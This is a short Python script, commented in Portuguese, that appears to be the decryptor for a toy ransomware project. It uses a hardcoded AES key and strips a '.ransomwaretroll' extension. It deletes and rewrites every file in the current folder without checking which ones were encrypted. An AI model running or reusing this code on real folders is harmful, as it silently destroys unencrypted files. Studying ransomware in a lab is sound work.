import os
import pyaes

# Percorre todos os arquivos na pasta
for nome_arquivo in os.listdir('.'):
    caminho_completo = os.path.join('.', nome_arquivo)

    # Verifica se é um arquivo
    if os.path.isfile(caminho_completo):
        # Abrir o arquivo a ser descriptografado
        with open(caminho_completo, "rb") as arquivo:
            file_data = arquivo.read()

        # Remover o arquivo criptografado
        os.remove(caminho_completo)

        # Chave de descriptografia
        key = b"testeransomwares"
        aes = pyaes.AESModeOfOperationCTR(key)

        # Descriptografar o arquivo
        decrypt_data = aes.decrypt(file_data)

        # Salvar o arquivo descriptografado
        novo_nome_arquivo = nome_arquivo.replace(".ransomwaretroll", "")
        with open(os.path.join('.', novo_nome_arquivo), 'wb') as novo_arquivo:
            novo_arquivo.write(decrypt_data)
